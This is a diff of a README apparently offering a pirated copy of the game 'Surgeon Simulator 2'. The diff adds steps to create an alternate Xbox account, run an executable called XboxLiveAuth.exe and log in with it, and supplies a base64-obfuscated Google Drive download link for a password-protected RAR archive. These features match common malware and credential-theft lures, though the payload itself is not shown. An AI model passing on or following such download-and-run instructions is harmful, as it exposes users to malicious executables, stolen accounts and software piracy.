@@ -21,15 +21,19 @@ Surgeon Simulator 2
 
 3. Open Steam
 
-4. Launch the game as admin
+4. Create a alt account on Microsoft Xbox
 
-5. Enjoy
+5. Launch XboxLiveAuth.exe
+
+6. Login with your alt account
+
+7. Enjoy
 
 ## Download:
 
-(base64 encoded link)
+aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xN1NtYTlSNms4ckdOLVU1anFuOXR6Nk9aeG02WnRvY1Yvdmlldz91c3A9c2hhcmluZw==
 
-## To play this game you need dot net , [click here to download it](https://dotnet.microsoft.com/en-us/download/dotnet/thank-you/runtime-desktop-5.0.17-windows-x64-installer)
+## To play this game you need dot net - [click here to download it](https://dotnet.microsoft.com/en-us/download/dotnet/thank-you/runtime-desktop-5.0.17-windows-x86-installer)
 
 Rar password: M4vm1337
 
